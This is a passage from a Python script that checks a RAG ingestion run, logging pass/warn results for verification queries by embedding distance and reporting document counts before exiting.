            status = "PASS" if passed else "WARN"
            log(f"  [{status}] distance={dist:.4f}")
            log(f"  -> {doc[:120].strip()}...")
            if not passed:
                all_passed = False
        else:
            log("  [FAIL] No results returned.")
            all_passed = False

    log("\n" + "=" * 60)
    total_docs = sum(len(d) for d in collections.values())
    log(f"Ingestion complete. {total_docs} documents across {len(collections)} collections.")
    if all_passed:
        log("All verification queries PASSED. RAG is ready for demo.")
    else:
        log("WARNING: Some queries returned high distance scores. Check embeddings.")
    log("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"FATAL: {e}")
        sys.exit(1)
